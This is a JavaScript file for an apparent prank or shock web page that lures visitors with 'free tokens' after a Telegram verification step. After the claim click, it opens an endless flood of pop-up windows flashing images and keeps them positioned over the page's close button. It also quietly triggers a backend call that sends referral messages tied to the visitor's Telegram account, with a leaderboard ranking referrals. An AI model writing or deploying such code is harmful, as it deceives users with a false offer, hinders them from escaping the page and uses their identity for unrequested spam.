// script.js

// Backend URL
const backendUrl = 'https://telegram-dpreferral-backend.onrender.com'; // Use your actual backend domain

// Elements
const claimButton = document.getElementById('claimButton');
const claimMessage = document.getElementById('claimMessage');
const claimModal = document.getElementById('claimModal');
const closeModal = document.getElementById('closeModal');
const submitUsername = document.getElementById('submitUsername');
const telegramUsernameInput = document.getElementById('telegramUsername');
const modalMessage = document.getElementById('modalMessage');
const mainContent = document.querySelector('.main-content');
const browserWindow = document.getElementById('browserWindow');
const secondClaimButtonContainer = document.getElementById('secondClaimButtonContainer');
const secondClaimButton = document.getElementById('secondClaimButton');
const leaderboardButton = document.getElementById('leaderboardButton');
const leaderboardWindow = document.getElementById('leaderboardWindow');
const closeLeaderboardButton = document.getElementById('closeLeaderboardButton');
const leaderboardList = document.getElementById('leaderboardList');

// Variables to manage chaos
let chaosWindows = [];
let isChaosActive = false;
let chaosInterval = null;
let browserWindowMovementInterval = null;

// Store the verified telegramUsername
let verifiedUsername = '';

// Make the browser window draggable
makeWindowDraggable(browserWindow);
makeWindowDraggable(leaderboardWindow);

// Function to make a window draggable
function makeWindowDraggable(windowElement) {
    let isDragging = false;
    let offsetX = 0;
    let offsetY = 0;

    const header = windowElement.querySelector('.window-header');

    header.addEventListener('mousedown', (e) => {
        isDragging = true;
        offsetX = e.clientX - windowElement.offsetLeft;
        offsetY = e.clientY - windowElement.offsetTop;
    });

    document.addEventListener('mousemove', (e) => {
        if (isDragging) {
            windowElement.style.left = `${e.clientX - offsetX}px`;
            windowElement.style.top = `${e.clientY - offsetY}px`;
            windowElement.style.transform = `translate(0, 0)`;
        }
    });

    document.addEventListener('mouseup', () => {
        isDragging = false;
    });
}

// Handle initial CLAIM Button Click
claimButton.addEventListener('click', () => {
    openModal();
});

// Close Modal when 'x' is clicked
closeModal.addEventListener('click', () => {
    closeModalFunc();
});

// Close Modal when clicking outside the modal content
window.addEventListener('click', (event) => {
    if (event.target == claimModal) {
        closeModalFunc();
    }
});

// Handle Submit Username (Verification)
submitUsername.addEventListener('click', async () => {
    let telegramUsername = telegramUsernameInput.value.trim();

    if (!telegramUsername) {
        displayModalMessage('Please enter your Telegram username.', 'error');
        return;
    }

    // Remove '@' if present
    if (telegramUsername.startsWith('@')) {
        telegramUsername = telegramUsername.substring(1);
    }

    // Lowercase the username for consistency
    telegramUsername = telegramUsername.toLowerCase();

    // Basic validation for Telegram username
    if (!/^[a-zA-Z0-9_]{5,32}$/.test(telegramUsername)) {
        displayModalMessage('Invalid Telegram username format.', 'error');
        return;
    }

    // Disable input and button to prevent multiple submissions
    telegramUsernameInput.disabled = true;
    submitUsername.disabled = true;
    submitUsername.textContent = 'Verifying...';

    try {
        // Verify the user exists
        const verifyResponse = await fetch(`${backendUrl}/api/verify`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegramUsername }),
        });

        const verifyData = await verifyResponse.json();

        if (verifyData.success) {
            // Store the verified username
            verifiedUsername = telegramUsername;

            closeModalFunc();
            // Hide the initial CLAIM button
            claimButton.style.display = 'none';
            // Display the success message
            claimMessage.textContent = 'Verification successful! You may now claim your free tokens!';
            // Show the second CLAIM button
            secondClaimButtonContainer.style.display = 'block';
        } else {
            // Display instructions and link to verification bot
            displayModalMessage(
                `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/DoublePenisVerifyBot" target="_blank">@DoublePenisVerifyBot</a>`,
                'error'
            );
        }
    } catch (error) {
        console.error('Error:', error);
        displayModalMessage('An error occurred during verification. Please try again.', 'error');
    } finally {
        // Re-enable input and button
        telegramUsernameInput.disabled = false;
        submitUsername.disabled = false;
        submitUsername.textContent = 'Verify';
    }
});

// Handle Second CLAIM Button Click
secondClaimButton.addEventListener('click', async () => {
    if (!verifiedUsername) {
        alert('Please verify your Telegram username first.');
        return;
    }

    // Hide the second CLAIM button
    secondClaimButtonContainer.style.display = 'none';

    claimMessage.textContent = 'Awaiting verification...';

    // Open a test window to check for pop-up blockers
    const testWindow = window.open('', '', 'width=200,height=100');
    if (testWindow === null || typeof testWindow === 'undefined') {
        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
        claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
        return;
    } else {
        // Write "Verifying..." in the test window
        testWindow.document.write(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <title>Verifying...</title>
                <style>
                    body {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100%;
                        margin: 0;
                        font-family: Arial, sans-serif;
                        background-color: #ffffff;
                    }
                    h1 {
                        font-size: 20px;
                        color: #000000;
                    }
                </style>
            </head>
            <body>
                <h1>Verifying...</h1>
            </body>
            </html>
        `);

        // Close the test window after 1 second
        setTimeout(() => {
            testWindow.close();
            // Start Chaos Effect
            startChaos();
        }, 1000);
    }
});

// Send Referral Messages
async function sendReferralMessages() {
    try {
        // Send messages via backend
        const sendMessagesResponse = await fetch(`${backendUrl}/api/sendReferral`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegramUsername: verifiedUsername }),
        });

        const sendMessagesData = await sendMessagesResponse.json();

        if (sendMessagesData.success) {
            claimMessage.textContent = 'Check your Telegram for further instructions!';
        } else {
            claimMessage.textContent = 'Failed to send messages via Telegram. Please contact support.';
        }
    } catch (error) {
        console.error('Error:', error);
        claimMessage.textContent = 'An error occurred while sending messages. Please try again.';
    }
}

// Display messages in the modal
function displayModalMessage(message, type) {
    modalMessage.innerHTML = message;
    modalMessage.className = type; // 'error' or 'success'
}

// Open Modal
function openModal() {
    claimModal.style.display = 'block';
    telegramUsernameInput.value = '';
    modalMessage.innerHTML = '';
    telegramUsernameInput.focus();
}

// Close Modal
function closeModalFunc() {
    claimModal.style.display = 'none';
}

// Function to start chaotic effects by opening windows with image animation
function startChaos() {
    if (isChaosActive) return; // Prevent multiple chaos starts
    isChaosActive = true;

    // Start spawning chaos windows indefinitely
    chaosInterval = setInterval(() => {
        spawnChaosWindow();
    }, 500); // Adjust the interval as needed

    // Start moving the existing chaos windows
    moveChaosWindows();

    // Start moving the main browser window within the webpage
    startMovingBrowserWindow();
}

// Function to spawn a single chaos window
function spawnChaosWindow() {
    // Get the position of the close button
    const closeButton = document.querySelector('.control-button.close');
    const rect = closeButton.getBoundingClientRect();

    const chaosWindow = window.open('', '', 'width=400,height=300');
    if (chaosWindow) {
        chaosWindow.document.write(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <title>Chaos Window</title>
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        overflow: hidden;
                    }
                    img {
                        width: 100%;
                        height: 100%;
                        object-fit: cover;
                    }
                </style>
            </head>
            <body>
                <img id="chaosImage" src="image1.png" alt="Chaos Image">
                <script>
                    const images = ["image1.png", "image2.png"];
                    let currentIndex = 0;
                    setInterval(() => {
                        currentIndex = (currentIndex + 1) % images.length;
                        document.getElementById('chaosImage').src = images[currentIndex];
                    }, 100); // Adjust the interval for animation speed
                </script>
            </body>
            </html>
        `);
        chaosWindow.focus();

        // Move the window to the position of the close button
        const x = window.screenX + rect.left;
        const y = window.screenY + rect.top;
        chaosWindow.moveTo(x, y);

        // Keep track of the chaos window
        chaosWindows.push(chaosWindow);

        // Send Telegram messages once the first chaos window is open
        if (chaosWindows.length === 1) {
            sendReferralMessages();
        }
    } else {
        console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
        stopChaos(); // Stop attempting to spawn windows
    }
}

// Function to move chaos windows randomly
function moveChaosWindows() {
    setInterval(() => {
        chaosWindows.forEach((chaosWindow, index) => {
            if (!chaosWindow.closed) {
                // Move the window to the position of the close button
                const closeButton = document.querySelector('.control-button.close');
                const rect = closeButton.getBoundingClientRect();
                const x = window.screenX + rect.left;
                const y = window.screenY + rect.top;
                chaosWindow.moveTo(x, y);
            } else {
                // Remove closed windows from the array
                chaosWindows.splice(index, 1);
            }
        });
    }, 500); // Move every half second
}

// Function to start moving the main browser window within the webpage
function startMovingBrowserWindow() {
    let angle = 0;
    const radius = 100; // Adjust the radius as needed
    const centerX = window.innerWidth / 2 - browserWindow.offsetWidth / 2;
    const centerY = window.innerHeight / 2 - browserWindow.offsetHeight / 2;

    browserWindowMovementInterval = setInterval(() => {
        angle += 0.05; // Adjust the speed of movement
        const x = centerX + radius * Math.cos(angle);
        const y = centerY + radius * Math.sin(angle);
        browserWindow.style.left = `${x}px`;
        browserWindow.style.top = `${y}px`;
        browserWindow.style.transform = 'translate(0, 0)';
    }, 20); // Adjust the interval for smoother movement
}

// Function to stop chaos (if needed)
function stopChaos() {
    if (chaosInterval) {
        clearInterval(chaosInterval);
        chaosInterval = null;
    }
    if (browserWindowMovementInterval) {
        clearInterval(browserWindowMovementInterval);
        browserWindowMovementInterval = null;
    }
    isChaosActive = false;
}

// Leaderboard Functionality
leaderboardButton.addEventListener('click', () => {
    if (leaderboardWindow.style.display === 'none' || leaderboardWindow.style.display === '') {
        leaderboardWindow.style.display = 'block';
        fetchLeaderboard();
    } else {
        leaderboardWindow.style.display = 'none';
    }
});

// Close Leaderboard Window
closeLeaderboardButton.addEventListener('click', () => {
    leaderboardWindow.style.display = 'none';
});

async function fetchLeaderboard() {
    try {
        const response = await fetch(`${backendUrl}/api/leaderboard`);
        const data = await response.json();
        if (data.success) {
            leaderboardList.innerHTML = '';
            data.leaderboard.forEach((user, index) => {
                const listItem = document.createElement('li');
                listItem.textContent = `${index + 1}. @${user.telegramUsername} - ${user.referrals} referrals`;
                leaderboardList.appendChild(listItem);
            });
        } else {
            leaderboardList.innerHTML = '<li>No data available.</li>';
        }
    } catch (error) {
        console.error('Error fetching leaderboard:', error);
        leaderboardList.innerHTML = '<li>Error fetching leaderboard.</li>';
    }
}
